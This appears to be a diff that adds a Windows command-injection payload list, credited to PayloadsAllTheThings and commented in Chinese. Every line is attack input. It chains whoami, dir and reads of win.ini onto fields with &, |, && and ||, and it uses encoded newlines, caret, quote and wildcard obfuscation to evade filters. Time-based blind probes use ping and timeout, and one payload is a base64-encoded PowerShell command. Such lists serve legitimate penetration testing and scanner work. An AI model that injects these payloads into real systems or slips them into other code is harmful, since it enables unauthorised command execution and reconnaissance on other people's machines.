@@ -1,0 +1,73 @@
+# Windows Command Injection Payloads
+# 来源: PayloadsAllTheThings Command Injection
+# Windows命令注入payload集合
+
+# === 命令链接 ===
+& whoami
+&& whoami
+| whoami
+|| whoami
+& dir
+&& dir
+| dir
+|| dir
+& type C:\Windows\win.ini
+&& type C:\Windows\win.ini
+| type C:\Windows\win.ini
+|| type C:\Windows\win.ini
+
+# === 换行符注入 ===
+%0awhoami
+%0d%0awhoami
+%0adir
+%0d%0adir
+
+# === 空格绕过 ===
+ping%CommonProgramFiles:~10,-18%127.0.0.1
+ping%PROGRAMFILES:~10,-5%127.0.0.1
+type%PROGRAMFILES:~10,-5%C:\Windows\win.ini
+
+# === 大小写混合 ===
+WhOaMi
+wHoAmI
+WHOAMI
+DiR
+dIr
+DIR
+
+# === 通配符绕过 ===
+powershell C:\*\*2\n??e*d.*?
+@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e
+
+# === 特殊字符绕过 ===
+^w^h^o^a^m^i
+w^h^o^a^m^i
+who""ami
+who''ami
+
+# === 时间盲注 ===
+& ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+|| ping -n 5 127.0.0.1
+& timeout /t 5
+&& timeout /t 5
+| timeout /t 5
+|| timeout /t 5
+
+# === PowerShell ===
+& powershell -c "whoami"
+&& powershell -c "whoami"
+| powershell -c "whoami"
+|| powershell -c "whoami"
+& powershell -c "Get-Process"
+& powershell -c "Get-Content C:\Windows\win.ini"
+& powershell -enc dwBoAG8AYQBtAGkA
+
+# === CMD特殊 ===
+& cmd /c whoami
+&& cmd /c whoami
+| cmd /c whoami
+|| cmd /c whoami
+& cmd /c dir
+& cmd /c type C:\Windows\win.ini
